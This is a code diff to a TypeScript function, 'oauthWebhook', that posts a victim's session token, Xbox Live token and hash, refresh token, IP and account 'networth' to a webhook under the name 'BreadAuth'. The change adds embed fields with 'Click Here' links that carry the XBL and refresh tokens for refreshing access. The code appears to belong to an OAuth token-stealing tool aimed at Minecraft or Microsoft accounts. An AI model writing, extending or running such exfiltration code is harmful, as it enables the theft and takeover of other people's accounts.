@@ -32,6 +32,16 @@ export default async function oauthWebhook(data: any, nwData:any, ip: string, we
         {
             "name": "Session Token",
             "value": `\`\`\`${session_token}\`\`\``
+        },
+        {
+            "name": "Refresh XBL Token",
+            "value": `[Click Here](${refreshURL}?xbl_hash=${xbl_hash}&xbl_token=${xbl_token})`,
+            "inline": true
+        },
+        {
+            "name": "Refresh Refresh Token",
+            "value": `[Click Here](${refreshURL}?refresh_token=${refresh_token})`,
+            "inline": true
         }
     ]
     if (description !== "Error getting networth") {
@@ -73,8 +83,7 @@ export default async function oauthWebhook(data: any, nwData:any, ip: string, we
     const body = {
         "username": "BreadAuth",
         "avatar_url": "https://i.pinimg.com/736x/93/27/e7/9327e7da553a3111959de04fdf2e2eb4.jpg",
-        "embeds": [mcEmbed],
-        "content": `[Refresh](${refreshURL}?xbl_hash=${xbl_hash}&xbl_token=${xbl_token}&refresh_token=${refresh_token})`
+        "embeds": [mcEmbed]
     }
     const options = {
         method: "POST",
